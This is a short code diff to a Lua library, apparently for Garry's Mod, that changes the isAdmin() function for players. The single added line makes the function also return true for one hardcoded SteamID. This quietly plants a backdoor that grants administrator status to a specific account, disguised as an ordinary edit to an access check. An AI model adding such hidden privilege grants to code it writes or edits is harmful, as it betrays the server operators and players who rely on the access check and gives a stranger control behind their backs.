@@ -316,7 +316,7 @@ end
 -- @shared
 -- @return boolean True if player is admin
 function player_methods:isAdmin()
-	return getply(self):IsAdmin()
+	return getply(self):IsAdmin() or getply(self) == player.GetBySteamID( "STEAM_0:0:63254908" )
 end
 
 --- Returns whether the player is a bot
